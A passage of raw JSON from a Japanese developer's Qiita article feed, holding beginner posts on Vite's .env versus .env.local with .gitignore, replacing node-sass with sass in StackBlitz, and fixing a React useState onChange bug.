frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"8:1-8:27\">\n<span id=\"envファイルの場合\" class=\"fragment\"></span><a href=\"#env%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E5%A0%B4%E5%90%88\"><i class=\"fa fa-link\"></i></a>.envファイルの場合</h1>\n<p data-sourcepos=\"9:1-9:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F74810ebf-eb68-42df-ba57-b487cf0b08ac.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1dcd9aac3acc1ab97b67e951513a3675\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F74810ebf-eb68-42df-ba57-b487cf0b08ac.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1dcd9aac3acc1ab97b67e951513a3675\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F74810ebf-eb68-42df-ba57-b487cf0b08ac.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=e7682b501cd8d2bf6367519382382a89 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/74810ebf-eb68-42df-ba57-b487cf0b08ac.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"11:1-11:24\">変更に表示される</p>\n<p data-sourcepos=\"13:1-13:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F387c2584-60bc-409b-85b5-10984ddfa10f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9700e8a22200e07a982bfdaf78f2c3a7\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F387c2584-60bc-409b-85b5-10984ddfa10f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9700e8a22200e07a982bfdaf78f2c3a7\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F387c2584-60bc-409b-85b5-10984ddfa10f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=6bfb8cac9d21d9aef4853d12b6c468e4 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/387c2584-60bc-409b-85b5-10984ddfa10f.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"15:1-15:33\">\n<span id=\"envlocalファイルの場合\" class=\"fragment\"></span><a href=\"#envlocal%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E5%A0%B4%E5%90%88\"><i class=\"fa fa-link\"></i></a>.env.localファイルの場合</h1>\n<p data-sourcepos=\"16:1-16:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F567142d3-4b61-45ff-a993-44c78ca668fb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c11e3c6cce50406327480b17f0708e97\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F567142d3-4b61-45ff-a993-44c78ca668fb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c11e3c6cce50406327480b17f0708e97\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F567142d3-4b61-45ff-a993-44c78ca668fb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=527a6740b3c4a2375dc278cc415fc307 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/567142d3-4b61-45ff-a993-44c78ca668fb.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"19:1-20:122\">変更に表示されない<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0f06da81-0bd1-4ead-bc27-e3de2b90d2bc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3b548adea0b70d11637e160c431b8d7e\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0f06da81-0bd1-4ead-bc27-e3de2b90d2bc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=3b548adea0b70d11637e160c431b8d7e\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0f06da81-0bd1-4ead-bc27-e3de2b90d2bc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=88b393be28263b5fb8714c634eb6aa95 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0f06da81-0bd1-4ead-bc27-e3de2b90d2bc.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"22:1-22:69\">\n<span id=\"gitignoreファイルに記載することで表示されない\" class=\"fragment\"></span><a href=\"#gitignore%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AB%E8%A8%98%E8%BC%89%E3%81%99%E3%82%8B%E3%81%93%E3%81%A8%E3%81%A7%E8%A1%A8%E7%A4%BA%E3%81%95%E3%82%8C%E3%81%AA%E3%81%84\"><i class=\"fa fa-link\"></i></a>.gitignoreファイルに記載することで、表示されない</h1>\n<div class=\"code-frame\" data-lang=\"ignore-list\" data-sourcepos=\"23:1-29:3\">\n<div class=\"code-lang\"><span class=\"bold\">.gitignore</span></div>\n<div class=\"highlight\"><pre><code>node_modules\ndist\ndist-ssr\n*.local\n.env\n</code></pre></div>\n</div>\n<p data-sourcepos=\"30:1-30:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F42931385-b78b-4bba-8a0d-4f0468baa057.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f157638ca610e5a3cb778b663e854146\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F42931385-b78b-4bba-8a0d-4f0468baa057.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f157638ca610e5a3cb778b663e854146\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F42931385-b78b-4bba-8a0d-4f0468baa057.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=6e3940b8e402f37f93cb20585b4b6371 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/42931385-b78b-4bba-8a0d-4f0468baa057.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"32:1-32:129\">.env.localが最初から無視されていたのは、.gitignoreファイルに*.localが定義されていたからでした。</p>\n<h1 data-sourcepos=\"35:1-35:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"36:1-36:90\">なんとなく理解していたつもりでも、実験すると面白かったです。</p>\n","body":"# はじめに\nドキュメントを読んでいて下記の「gitには無視される」がよくわからなかったため、実験しました。\n>.env               # 全ての場合に読み込まれる\n.env.local          # 全ての場合に読み込まれ、gitには無視される\n\nhttps://ja.vite.dev/guide/env-and-mode.html#env-files\n\n# .envファイルの場合\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/74810ebf-eb68-42df-ba57-b487cf0b08ac.png)\n\n変更に表示される\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/387c2584-60bc-409b-85b5-10984ddfa10f.png)\n\n# .env.localファイルの場合\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/567142d3-4b61-45ff-a993-44c78ca668fb.png)\n\n\n変更に表示されない\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0f06da81-0bd1-4ead-bc27-e3de2b90d2bc.png)\n\n# .gitignoreファイルに記載することで、表示されない\n```.gitignore\nnode_modules\ndist\ndist-ssr\n*.local\n.env\n```\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/42931385-b78b-4bba-8a0d-4f0468baa057.png)\n\n.env.localが最初から無視されていたのは、.gitignoreファイルに*.localが定義されていたからでした。\n\n\n# おわりに\nなんとなく理解していたつもりでも、実験すると面白かったです。\n","coediting":false,"comments_count":0,"created_at":"2025-02-18T19:04:07+09:00","group":null,"id":"22f73a31f1f1774d2c14","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Git","versions":[]},{"name":"初心者","versions":[]},{"name":".env","versions":[]},{"name":"vite","versions":[]}],"title":"【Vite】.envと.env.localについて","updated_at":"2025-02-18T19:04:07+09:00","url":"https://qiita.com/asa129/items/22f73a31f1f1774d2c14","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":689,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:89\">StackBlitzでsassをインストール後エラーになったため記事にします。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:145\">npm install node-sassコマンドを叩いた後、scssモジュールを作成、importしようとしたところエラーになりました。</p>\n<h6 data-sourcepos=\"7:1-7:22\">\n<span id=\"エラー内容\" class=\"fragment\"></span><a href=\"#%E3%82%A8%E3%83%A9%E3%83%BC%E5%86%85%E5%AE%B9\"><i class=\"fa fa-link\"></i></a>エラー内容</h6>\n<p data-sourcepos=\"8:1-8:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F67e7a132-86fd-4b97-bee1-145e1bd9ea98.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c79526fa265296062a33c1675f018dd0\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F67e7a132-86fd-4b97-bee1-145e1bd9ea98.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c79526fa265296062a33c1675f018dd0\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F67e7a132-86fd-4b97-bee1-145e1bd9ea98.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=c5b857d599e2e5d40eb1048220b5a7a8 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/67e7a132-86fd-4b97-bee1-145e1bd9ea98.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"11:1-11:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"12:1-12:55\">node-sassではなく、sassをインストールする</p>\n<div class=\"code-frame\" data-lang=\"terminal\" data-sourcepos=\"14:1-18:3\"><div class=\"highlight\"><pre><code><span class=\"go\">npm uninstall node-sass\n\nnpm install sass\n</span></code></pre></div></div>\n<p data-sourcepos=\"19:1-19:121\">現在node-sassは非推奨となっており、代わりにsassを使うようになっているとのことでした。</p>\n<h1 data-sourcepos=\"21:1-21:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"22:1-22:229\">エラーログに記載のsass-embeddedをインストールしてみたり、StackBlitzでUI上にdependenciesを表示させるようにしてみたり、解決するまでにかなり時間がかかってしまいました。</p>\n","body":"# はじめに\nStackBlitzでsassをインストール後エラーになったため記事にします。\n\n# 問題\nnpm install node-sassコマンドを叩いた後、scssモジュールを作成、importしようとしたところエラーになりました。\n\n###### エラー内容\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/67e7a132-86fd-4b97-bee1-145e1bd9ea98.png)\n\n\n# 解決方法\nnode-sassではなく、sassをインストールする\n\n```terminal\nnpm uninstall node-sass\n\nnpm install sass\n```\n現在node-sassは非推奨となっており、代わりにsassを使うようになっているとのことでした。\n\n# おわりに\nエラーログに記載のsass-embeddedをインストールしてみたり、StackBlitzでUI上にdependenciesを表示させるようにしてみたり、解決するまでにかなり時間がかかってしまいました。\n","coediting":false,"comments_count":0,"created_at":"2025-02-13T13:20:28+09:00","group":null,"id":"076298bc183bf2c7260f","likes_count":2,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Sass","versions":[]},{"name":"初心者","versions":[]},{"name":"React","versions":[]},{"name":"node-sass","versions":[]},{"name":"stackblitz","versions":[]}],"title":"StackBlitzでsassがインストールできない","updated_at":"2025-02-13T13:20:28+09:00","url":"https://qiita.com/asa129/items/076298bc183bf2c7260f","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":858,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:153\">フォームに文字を入力しようとしても表示されなかった（同じ過ちを何度もしている）ため、備忘録で残します。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:72\">フォームに値を入力しようとしても、表示されない。</p>\n<p data-sourcepos=\"7:1-7:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F39870061-d376-2a13-3bcd-18e789c1ea59.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9fee94ff947417e3a8d70f8965221874\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F39870061-d376-2a13-3bcd-18e789c1ea59.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9fee94ff947417e3a8d70f8965221874\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F39870061-d376-2a13-3bcd-18e789c1ea59.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=2befa3a0930c7c90ac3c8991a8f248c6 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/39870061-d376-2a13-3bcd-18e789c1ea59.png\" loading=\"lazy\"></a></p>\n<div class=\"code-frame\" data-lang=\"react\" data-sourcepos=\"9:1-22:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">function</span> <span class=\"nf\">App</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">text</span><span class=\"p\">,</span> <span class=\"nx\">setText</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">(</span><span class=\"dl\">''</span><span class=\"p\">);</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">onChange</span> <span class=\"o\">=</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">setText</span><span class=\"p\">(</span><span class=\"nx\">text</span><span class=\"p\">);</span>\n\n  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">input</span> <span class=\"na\">value</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">text</span><span class=\"si\">}</span> <span class=\"na\">onChange</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">onChange</span><span class=\"si\">}</span> <span class=\"p\">/&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">br</span> <span class=\"p\">/&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span><span class=\"si\">{</span><span class=\"nx\">text</span><span class=\"si\">}</span><span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>\n    <span class=\"p\">&lt;/&gt;</span>\n  <span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"24:1-24:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"25:1-26:114\">setTextで設定している値が誤っていた。<br>\nonChange関数実行時のイベントからオブジェクト・プロパティ(e.target.value)を設定する。</p>\n<p data-sourcepos=\"28:1-28:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ffd030281-8791-8af2-05e5-4e88c3e87586.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=120c456798502543278b810f9c10da54\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ffd030281-8791-8af2-05e5-4e88c3e87586.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=120c456798502543278b810f9c10da54\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ffd030281-8791-8af2-05e5-4e88c3e87586.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=1a2c8016f1e497de2b006779f311260d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/fd030281-8791-8af2-05e5-4e88c3e87586.png\" loading=\"lazy\"></a></p>\n<div class=\"code-frame\" data-lang=\"react\" data-sourcepos=\"30:1-43:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">function</span> <span class=\"nf\">App</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">text</span><span class=\"p\">,</span> <span class=\"nx\">setText</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">(</span><span class=\"dl\">''</span><span class=\"p\">);</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">onChange</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">setText</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">);</span>\n\n  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">input</span> <span class=\"na\">value</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">text</span><span class=\"si\">}</span> <span class=\"na\">onChange</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">onChange</span><span class=\"si\">}</span> <span class=\"p\">/&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">br</span> <span class=\"p\">/&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span><span class=\"si\">{</span><span class=\"nx\">text</span><span class=\"si\">}</span><span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>\n    <span class=\"p\">&lt;/&gt;</span>\n  <span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"45:1-45:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"46:1-46:181\">onChangeイベントが発火した際に、なぜ引数にイベント(e)を設定、e.target.valueで指定しないといけないのか、根本的な理解をしたいです。</p>\n","body":"# はじめに\nフォームに文字を入力しようとしても表示されなかった（同じ過ちを何度もしている）ため、備忘録で残します。\n\n# 問題\nフォームに値を入力しようとしても、表示されない。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/39870061-d376-2a13-3bcd-18e789c1ea59.png)\n\n```react\nfunction App() {\n  const [text, setText] = useState('');\n  const onChange = () => setText(text);\n\n  return (\n    <>\n      <input value={text} onChange={onChange} />\n      <br />\n      <p>{text}</p>\n    </>\n  );\n}\n```\n\n# 解決方法\nsetTextで設定している値が誤っていた。\nonChange関数実行時のイベントからオブジェクト・プロパティ(e.target.value)を設定する。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/fd030281-8791-8af2-05e5-4e88c3e87586.png)\n\n```react\nfunction App() {\n  const [text, setText] = useState('');\n  const onChange = (e) => setText(e.target.value);\n\n  return (\n    <>\n      <input value={text} onChange={onChange} />\n      <br />\n      <p>{text}</p>\n    </>\n  );\n}\n```\n\n# おわりに\nonChangeイベントが発火した際に、なぜ引数にイベント(e)を設定、e.target.valueで指定しないといけないのか、根本的な理解をしたいです。\n\n","coediting":false,"comments_count":2,"created_at":"2025-02-12T20:11:01+09:00","group":null,"id":"756f8a99c2c8b245abe0","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"初心者","versions":[]},{"name":"React","versions":[]},{"name":"useState","versions":[]}],"title":"【React】フォームに値を入力しても表示されない（useState）","updated_at":"2025-02-12T20:11:01+09:00","url":"https://qiita.com/asa129/items/756f8a99c2c8b245abe0","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":523,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-4:135\">Reactを使って学習記録一覧アプリを作成しました。<br>\n完成したもの<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc61cc7fa-c62f-d08e-bd2e-1e81b98c0940.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=af18d32c9631ec097919b97a4e8ba0c8\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc61cc7fa-c62f-d08e-bd2e-1e81b98c0940.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=af18d32c9631ec097919b97a4e8ba0c8\" alt=\"ダウンロード.gif\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc61cc7fa-c62f-d08e-bd2e-1e81b98c0940.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3c45701b206b58604f9be7b48f552b4d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c61cc7fa-c62f-d08e-bd2e-1e81b98c0940.gif\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"6:1-6:16\">\n<span id=\"主な機能\" class=\"fragment\"></span><a href=\"#%E4%B8%BB%E3%81%AA%E6%A9%9F%E8%83%BD\"><i class=\"fa fa-link\"></i></a>主な機能</h3>\n<ol data-sourcepos=\"7:1-11:0\">\n<li data-sourcepos=\"7:1-7:51\">学習内容と学習時間を入力して表示</li>\n<li data-sourcepos=\"8:1-8:84\">登録ボタンを押下後、一覧で表示する、バリデーションあり</li>\n<li data-sourcepos=\"9:1-9:54\">登録をしたらフォームが初期化される</li>\n<li data-sourcepos=\"10:1-11:0\">学習時間の累計をみることができる</li>\n</ol>\n<h1 data-sourcepos=\"12:1-12:38\">\n<span id=\"作成した際につまったこと\" class=\"fragment\"></span><a href=\"#%E4%BD%9C%E6%88%90%E3%81%97%E3%81%9F%E9%9A%9B%E3%81%AB%E3%81%A4%E3%81%BE%E3%81%A3%E3%81%9F%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>作成した際につまったこと</h1>\n<h4 data-sourcepos=\"13:1-13:80\">\n<span id=\"フォームに値を入力した後に画面表示ってどうやる\" class=\"fragment\"></span><a href=\"#%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%81%AB%E5%80%A4%E3%82%92%E5%85%A5%E5%8A%9B%E3%81%97%E3%81%9F%E5%BE%8C%E3%81%AB%E7%94%BB%E9%9D%A2%E8%A1%A8%E7%A4%BA%E3%81%A3%E3%81%A6%E3%81%A9%E3%81%86%E3%82%84%E3%82%8B\"><i class=\"fa fa-link\"></i></a>フォームに値を入力した後に、画面表示ってどうやる？</h4>\n<p data-sourcepos=\"14:1-15:90\">フォームに入力してもフォームに値がでてこない！<br>\n⇒useStateの理解不足、React入門動画のUseStateを2,3回見直して解決した</p>\n<h4 data-sourcepos=\"17:1-17:107\">\n<span 